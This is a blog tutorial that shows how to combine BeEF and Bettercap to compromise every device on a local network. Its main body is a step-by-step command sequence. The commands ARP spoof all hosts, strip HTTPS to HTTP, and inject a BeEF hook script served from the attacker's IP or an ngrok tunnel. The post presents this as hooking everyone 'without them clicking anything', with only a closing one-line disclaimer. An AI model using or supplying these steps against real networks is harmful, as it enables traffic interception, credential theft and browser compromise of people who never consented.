---
title: Beef + Bettercap, Hook The Whole Network
publishedOn: January 31st, 2023
slug: beef-bettercap
excerpt: Beef and Bettercap can be used together to automate network hooking. Beef is an open-source framework for penetration testing and security assessments, used to run and manage a collection of browser exploitation tools. Bettercap is a Swiss army knife for network attacks and monitoring. By combining Beef and Bettercap, a hacker can create a custom tool to automate the process of hooking, or compromising, every device on a network.
readingTime: 5 mins
---

# Browser Exploitation Framework + Bettercap
## Hook the whole network

Beef and Bettercap can be used together to automate network hooking. Beef is an open-source framework for penetration testing and security assessments, used to run and manage a collection of browser exploitation tools. Bettercap is a Swiss army knife for network attacks and monitoring. By combining Beef and Bettercap, a hacker can create a custom tool to automate the process of hooking, or compromising, every device on a network.

## Main Concepts

- ARP Spoofing: A technique used to intercept data packets by deceiving the target device into believing that the attacker's device is the default gateway.
- SSL Stripping: A method used to downgrade HTTPS connections to unencrypted HTTP, allowing an attacker to see and modify the data being transmitted.
- Network Communication: Understanding how data is transmitted between devices on a network and the different protocols used (such as HTTP, HTTPS, DNS, etc.).
- Man-in-the-Middle Attacks: Understanding the concept of intercepting and manipulating network communication between two parties without their knowledge.
- Browser Exploitation: Understanding how to exploit vulnerabilities in web browsers to gain control over the target device.


In the world of cybersecurity, network hooking is a technique used to compromise devices on a network to assess its security or perform malicious attacks. Beef and Bettercap are two powerful tools that can be used together to automate this process. In this article, we'll take a closer look at how to use these tools to hook a network.

## **What is Beef?**
Beef is an open-source framework for penetration testing and security assessments. It runs a collection of browser exploitation tools and provides a web-based interface to manage these tools. With Beef, a hacker can easily find and exploit vulnerabilities in web browsers to compromise target devices.

## **What is Bettercap?**
Bettercap is a Swiss army knife for network attacks and monitoring. It can perform various functions such as ARP spoofing, DNS spoofing, and SSL stripping. By using Bettercap, a hacker can manipulate network traffic and launch man-in-the-middle attacks to compromise target devices.

## **Using Beef and Bettercap Together**
In this demo, I am going to assume you have a working version of beef-xss and Bettercap already.

Start Beef with....
    `sudo beef-xss`

Start Bettercap, 

`sudo bettercap en0`

Now we need to turn on net.probe to find devices on our network
so from inside Bettercap...
`net.probe on`

To see your network...

`net.show`

We need to set some clients to arp spoof, or you can choose the whole network. 

`set arp.spoof.targets <ip>,<ip>, <ip> OR *`


Let's see what's needed to move forward

`help http.proxy`

Start up Beef

`sudo beef-xss`

Now you should see both beefs web-ui url and a hook url. Check your IP address as well, or use ngrok to expose your local host. 

Start the arp spoof we set earlier..

`arp.spoof on`

We need to configure ssl strip

`set http.proxy.sslstrip true`

Put the beef hook on the proxy

`set http.proxy.injectjs <insert your beef hook>`

`set http.proxy.injectjs <http://My IP or Ngrok url/hook.js>`

Make sure to either add your external or start ngrok to expose you're localhost beef server.

Now make sure to turn on http.proxy now that settings are configured....

Also make sure everything else is started. Net.probe on, net.sniff on, net.recon on

`http.proxy on`

### **Now we are setup to hook everyone on the network automatically without them clicking anything at all.**

# *Always use responsibly, this is to be tested on your own network*

## Brendan Frisby
[Github](https://github.com/bfrisbyh92)




